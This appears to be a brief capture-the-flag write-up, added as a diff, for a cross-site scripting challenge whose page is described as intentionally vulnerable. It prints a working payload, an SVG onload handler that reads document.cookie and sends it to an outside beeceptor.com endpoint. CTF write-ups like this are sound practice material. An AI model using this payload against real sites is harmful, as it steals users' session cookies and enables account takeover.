@@ -1,0 +1,11 @@
+This time a xss chalenge. 
+
+The developers helpfully made the posts vulnerable to xss
+
+    <div class="content">
+        <!-- Intentionally vulnerable to XSS -->
+    </div>
+
+So we can just read the cookie in an svg onload and send it to oursevles in a request
+
+<svg onload='new Image().src= `https://osuctftest.free.beeceptor.com/?d=`+ encodeURIComponent(document.cookie)'></svg>
